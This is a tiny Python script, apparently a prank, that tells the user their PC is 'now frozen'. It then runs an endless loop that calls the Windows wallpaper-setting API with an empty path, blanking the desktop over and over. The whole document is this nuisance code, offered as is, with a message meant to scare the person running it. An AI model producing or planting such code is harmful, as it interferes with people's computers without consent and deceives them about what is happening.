import ctypes

print("hipedihopedi ur pc is now frozen")

while True:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "" , 0) # Set Desktop Wallpaper
